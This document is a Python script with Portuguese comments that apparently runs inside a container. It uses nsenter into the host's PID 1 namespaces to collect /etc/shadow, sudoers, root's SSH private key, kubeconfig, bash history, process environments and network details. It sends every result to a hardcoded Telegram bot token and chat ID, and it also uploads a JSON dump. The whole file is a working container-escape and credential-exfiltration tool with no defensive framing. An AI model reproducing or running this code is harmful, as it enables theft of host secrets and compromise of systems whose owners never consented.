#!/usr/bin/env python3
"""
Script de coleta avançada via nsenter – ignora erros e captura tudo.
"""

import subprocess
import json
import requests
import os
import sys
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def main():
    send_telegram("🚀 **Coleta avançada via nsenter**")
    
    # Lista de comandos para executar no namespace do host
    commands = {
        "hostname": "hostname",
        "id": "id",
        "env": "env",
        "ps": "ps auxfww",
        "mount": "mount",
        "df": "df -h",
        "netstat": "netstat -tulpn 2>/dev/null || ss -tulpn",
        "ip_a": "ip a 2>/dev/null || echo 'N/A'",
        "ip_route": "ip route 2>/dev/null || echo 'N/A'",
        "ls_root": "ls -la /root/ 2>/dev/null || echo 'N/A'",
        "ls_etc": "ls -la /etc/ 2>/dev/null || echo 'N/A'",
        "cat_shadow": "cat /etc/shadow 2>/dev/null || echo 'N/A'",
        "cat_passwd": "cat /etc/passwd 2>/dev/null || echo 'N/A'",
        "cat_sudoers": "cat /etc/sudoers 2>/dev/null || echo 'N/A'",
        "cat_hostname": "cat /etc/hostname 2>/dev/null || echo 'N/A'",
        "cat_resolv": "cat /etc/resolv.conf 2>/dev/null || echo 'N/A'",
        "cat_bash_history": "cat /root/.bash_history 2>/dev/null || echo 'N/A'",
        "cat_ssh_id_rsa": "cat /root/.ssh/id_rsa 2>/dev/null || echo 'N/A'",
        "cat_kubeconfig": "cat /root/.kube/config 2>/dev/null || echo 'N/A'",
        "cat_docker_env": "cat /var/run/docker.sock 2>/dev/null || echo 'N/A'",
        "proc_environ": "cat /proc/1/environ 2>/dev/null || echo 'N/A'",
        "proc_cmdline": "cat /proc/1/cmdline 2>/dev/null || echo 'N/A'",
    }
    
    data = {}
    for key, cmd in commands.items():
        full_cmd = f"nsenter -t 1 -m -u -i -n sh -c '{cmd}' 2>/dev/null || echo 'FALHA'"
        data[key] = run(full_cmd)
        send_telegram(f"📄 **{key}**\n```\n{data[key][:500]}\n```")
    
    # Salva localmente
    filename = f"data_{int(datetime.now().timestamp())}.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)
    
    # Tenta enviar o arquivo
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        files = {'document': open(filename, 'rb')}
        requests.post(url, files=files, data={"chat_id": TELEGRAM_CHAT_ID, "caption": "📁 Dados completos"}, timeout=30)
    except:
        pass
    
    send_telegram("✅ **Coleta finalizada.**")

if __name__ == "__main__":
    main()
